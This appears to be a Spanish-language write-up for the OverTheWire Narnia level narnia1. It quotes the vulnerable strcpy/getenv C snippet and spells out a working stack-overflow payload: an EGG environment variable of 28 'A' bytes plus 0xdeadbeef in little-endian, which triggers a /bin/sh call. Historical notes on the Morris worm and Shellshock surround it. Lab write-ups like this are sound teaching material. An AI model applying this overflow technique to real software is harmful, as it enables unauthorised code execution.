![banner](assets/banner.jpg)

# `> [RECON]`

```bash
$ cat /narnia/narnia1.c
```

```c
char buffer[20];
strcpy(buffer, getenv("EGG"));
if(val == 0xdeadbeef) system("/bin/sh");
```

Veinte bytes.

```txt
[ normal execution ]
```

↓

```txt
[ 0xdeadbeef ]
```

Eso fue todo lo que separó el stack

de una decisión que nunca debió obedecer input externo.

---

```bash
$ echo $VECTOR
```

```txt
> getenv busca
> strcpy obedece
> el stack recuerda todo
```

---

```bash
$ echo $FINDING
```

`strcpy()` no valida.

Nunca preguntó:

```txt
cuánto pesa EGG
```

Solo copió.

```txt
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
```

Byte tras byte.

Hasta tocar algo

que nunca debió ser alcanzado.

---

```bash
$ printf 'A%.0s' {1..28}
```

Veintiocho bytes.

No treinta. No veinte.

Veintiocho.

La distancia exacta entre input externo

y control de flujo.

---

```bash
$ echo $HISTORICAL_NOISE
```

1988.

ARPANET aprendió que confiar en `strcpy()` no era una decisión técnica.

Era una superficie de ataque.

Morris no necesitó exploits cinematográficos.

Solo software copiando memoria como si el límite fuera decorativo.

---

```bash
$ echo $STACK
```

```txt
low memory

[ buffer ][ padding ][ val ]

high memory
```

Eso es todo.

No magia. No hacking hollywoodense.

Solo memoria lineal obedeciendo escritura secuencial.

---

```bash
$ export EGG=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*28+b"\xef\xbe\xad\xde")')
```

Little endian.

La CPU lee al revés.

Danny Cohen escribió sobre eso mucho antes de que internet convirtiera `0xdeadbeef` en folklore.

---

```txt
[ finding ]
stack control achieved
```

Crashear no es controlar.

Muchos descubren eso tarde.

---

```bash
$ echo $ENVIRONMENT
```

El vector nunca fue stdin.

Fue el entorno.

Y en 2014 Shellshock recordó otra vez que las variables de entorno no son contexto inocente.

Son territorio ejecutable.

---

```txt
██████████████████████████████████
█                                █
█  getenv busca.                █
█  strcpy obedece.              █
█  el stack recuerda todo.      █
█                                █
██████████████████████████████████
```

```bash
$ echo $NEXT
> narnia2
```



> *→ [youtube.com/@t474-r0b07](https://youtube.com/@t474-r0b07)*
> *→ siguiente: [narnia2](../narnia2/)*

<!-- 0x45 0x47 0x47 // 3l v3ct0r 3st4b4 3n 3l 3nt0rn0. s13mpr3. -->

